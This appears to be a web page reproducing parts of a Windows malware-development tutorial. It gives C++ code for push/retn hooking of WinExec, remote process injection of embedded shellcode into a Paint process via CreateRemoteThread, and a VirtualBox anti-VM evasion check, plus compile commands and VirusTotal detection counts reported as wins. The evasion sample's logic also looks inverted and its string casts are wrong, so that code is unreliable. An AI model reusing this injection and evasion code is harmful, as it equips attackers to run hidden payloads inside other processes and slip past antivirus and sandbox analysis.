+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is worked perfectly! :) Let’s go to check one of our victim process, for example OneDrive:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">There is a one caveat. The provided below code is a dirty proof-of-concept and may crash certain processes. For example, in my case SearchUI.exe is crashet and not worked after run my example. Then, upload our malware to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/5835847d11b7f891e70681e2ec3a1e22013fa3ff e31a36429e7814a3be40bd97/detection So, 7 of 69 AV engines detect our file as malicious. Moneta64.exe result:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The reason why it’s good to have this technique in your arsenal is because it does not require you to allocate new <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">RWX</code> memory to copy your payload over to by using <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAllocEx</code> which is more popular and suspicious and which is more closely investigated by the blue teamers. I hope this section spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. VirtualQueryEx</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">CreateToolhelp32Snapshot Process32First Process32Next <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">OpenProcess</code> Taking a snapshot and viewing processes <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">WriteProcessMemory</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">CreateRemoteThread</code> Hunting memory Moneta64.exe source code in Github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">29. windows API hooking part 2. Simple C++ example.</p>
+
+            <div id="what-is-api-hooking" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>What is API hooking?</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">API hooking is a technique by which we can instrument and modify the behaviour and flow of API calls. This technique is also used by many AV solutions to detect if code is malicious. The easiest way of hooking is by inserting a jump instruction. In this section I will show you another technique. This method is six bytes in total, and looks like the following. The push instruction pushes a 32bit value on the stack, and the retn instruction pops a 32bit address off the stack into the Instruction Pointer (in other words, it starts execution at the address which is found at the top of the stack.) example 1 Let’s look at an example. In this case I can hook a function WinExec from kernel32.dll (hooking.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>x64 Assembly</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-nasm">/*
+hooking.cpp
+basic hooking example with push/retn method
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2022/03/08/basic-hooking-2.html
+*/
+#include &lt;windows.h&gt;
+// buffer for saving original bytes
+char originalBytes[6];
+
+FARPROC hookedAddress;
+// we will jump to after the hook has been installed
+int __stdcall myFunc(LPCSTR lpCmdLine, UINT uCmdShow) {
+WriteProcessMemory(GetCurrentProcess(),
+(LPVOID)hookedAddress, originalBytes, 6, NULL);
+return WinExec("mspaint", uCmdShow);
+}
+// hooking logic
+void setMySuperHook() {
+HINSTANCE hLib;
+VOID *myFuncAddress;
+DWORD *rOffset;
+DWORD *hookAddress;
+DWORD src;
+DWORD dst;
+CHAR patch[6]= {0};
+// get memory address of function WinExec
+hLib = LoadLibraryA("kernel32.dll");
+hookedAddress = GetProcAddress(hLib, "WinExec");
+// save the first 6 bytes into originalBytes (buffer)
+ReadProcessMemory(GetCurrentProcess(),
+(LPCVOID) hookedAddress,
+originalBytes, 6, NULL);
+// overwrite the first 6 bytes with a jump to myFunc
+myFuncAddress = &amp;myFunc;
+// create a patch "push &lt;addr&gt;, retn"
+memcpy_s(patch, 1, "\x68", 1); // 0x68 opcode for push
+memcpy_s(patch + 1, 4, &amp;myFuncAddress, 4);
+memcpy_s(patch + 5, 1, "\xC3", 1); // opcode for retn
+WriteProcessMemory(GetCurrentProcess(),
+(LPVOID)hookedAddress, patch, 6, NULL);
+}
+int main() {
+// call original
+WinExec("notepad", SW_SHOWDEFAULT);
+
+// install hook
+setMySuperHook();
+// call after install hook
+WinExec("notepad", SW_SHOWDEFAULT);
+}
+As you can see, the source code is identical to the example from the first section about
+hooking. The only difference is:
+
+That will translate into the following assembly instructions:
+// push myFunc memory address onto the stack
+push myFunc
+// jump to myFunc
+retn</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile it: i686-w64-mingw32-g++ -O2 hooking.cpp -o hooking.exe \ -mconsole -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive >/dev/null 2>&1</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And run on Windows 7 x64: .\hooking.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see everything is worked perfectly :) x86 API Hooking Demystified WinExec source code in github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">30. process injection via FindWindow. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is the result of my self-researching one of the Win32 API function. One of my previous posts, I wrote how to find process by name, for my injector? When writing process or DLL injectors, it would be nice to find, for example, all windows running in the system and try to inject into the process launched by the administrator. In the simplest case to find the any window of a process that will be our victim.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The flow is this technique is simple. Let’s go to investigate source code:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+* hack.cpp - classic process injection
+* via FindWindow. C++ implementation
+* @cocomelonc
+* https://cocomelonc.github.io/tutorial/
+2022/03/08/malware-injection-17.html
+*/
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+int main() {
+HANDLE ph;
+HANDLE rt;
+DWORD pid;
+// find a window for mspaint.exe
+HWND hw = FindWindow(NULL, (LPCSTR) "Untitled - Paint");
+if (hw == NULL) {
+printf("failed to find window :(\n");
+return -2;
+}
+GetWindowThreadProcessId(hw, &amp;pid);
+ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+LPVOID rb = VirtualAllocEx(ph, NULL,
+sizeof(my_payload),
+MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(ph, rb, my_payload,
+sizeof(my_payload), NULL);
+rt = CreateRemoteThread(ph, NULL, 0,
+(LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
+CloseHandle(ph);
+return 0;
+
+}
+As usually, for simplicity I used meow-meow messagebox payload:
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+As you can, see, the main logic is here:
+//...
+// find a window for mspaint.exe
+HWND hw = FindWindow(NULL, (LPCSTR) "Untitled - Paint");
+if (hw == NULL) {
+printf("failed to find window :(\n");
+return -2;
+}
+GetWindowThreadProcessId(hw, &amp;pid);
+ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+//...
+Demo
+Let’s go to compile:
+
+x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
+-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
+-fdata-sections -Wno-write-strings -Wint-to-pointer-cast \
+-fno-exceptions -fmerge-all-constants \
+-static-libstdc++ -static-libgcc -fpermissive
+
+and run:
+.\hack.exe 1304
+
+As you can see, everything is work perfectly :)
+anti-VM
+Another example of using this function is VM “evasion”. The fact that some windows’
+names are only present in virtual environment and not is usual host OS.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s look at an example:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+* hack.cpp - VM evasion via FindWindow. C++ implementation
+* @cocomelonc
+* https://cocomelonc.github.io/tutorial/
+2022/03/08/malware-injection-17.html
+*/
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+int main(int argc, char* argv[]) {
+HANDLE ph;
+HANDLE rt;
+DWORD pid;
+// find a window with certain class name
+HWND hcl = FindWindow((LPCSTR) L"VBoxTrayToolWndClass", NULL);
+HWND hw = FindWindow(NULL, (LPCSTR) L"VBoxTrayToolWnd");
+if (hcl || hw) {
+pid = atoi(argv[1]);
+ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+LPVOID rb = VirtualAllocEx(ph, NULL, sizeof(my_payload),
+MEM_RESERVE | MEM_COMMIT,
+PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(ph, rb, my_payload,
+sizeof(my_payload), NULL);
+rt = CreateRemoteThread(ph, NULL, 0,
+(LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
+CloseHandle(ph);
+return 0;
+} else {
+printf("virtualbox VM detected :(");
+return -2;
+}
+}
+As you can see we just check if windows with the following class names are present in
+the OS:
+VBoxTrayToolWndClass
+VBoxTrayToolWnd
+
+Let’s go to compile:
+x86_64-w64-mingw32-g++ hack2.cpp -o hack2.exe -mconsole \
+-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
+-fdata-sections -Wno-write-strings -Wint-to-pointer-cast \
+-fno-exceptions -fmerge-all-constants \
+-static-libstdc++ -static-libgcc -fpermissive
+
+And run:
+.\hack2.exe 1304
+
+So everything is work perfectly for our VirtualBox Windows 10 x64</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to upload hack2.exe to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, 4 of 66 AV engines detect our file as malicious. https://www.virustotal.com/gui/file/dd340e3de34a8bd76c8693832f9a665b47e98fce 58bf8d2413f2173182375787/detection I hope this section spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. FindWindow Evasions UI artifacts source code in Github</p></main></body></html>
